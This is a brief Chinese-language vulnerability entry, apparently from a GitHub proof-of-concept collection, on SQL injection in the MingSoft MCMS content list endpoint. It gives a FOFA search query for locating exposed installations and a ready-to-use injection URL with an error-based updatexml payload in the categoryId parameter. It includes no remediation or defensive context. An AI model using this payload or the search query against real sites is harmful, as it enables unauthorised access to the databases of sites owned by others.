## 铭飞CMS list接口存在SQL注入

## fofa
```
body="铭飞MCMS" || body="/mdiy/formData/save.do" || body="static/plugins/ms/1.0.0/ms.js"
```

## poc
```
http://127.0.0.1/cms/content/list?categoryId=1%27%20and%20updatexml(1,concat(0x7e,md5(123),0x7e),1)%20and%20%271
```
![image](https://github.com/wy876/POC/assets/139549762/9f9df303-e0b5-4707-a3a8-228e97ab74a0)
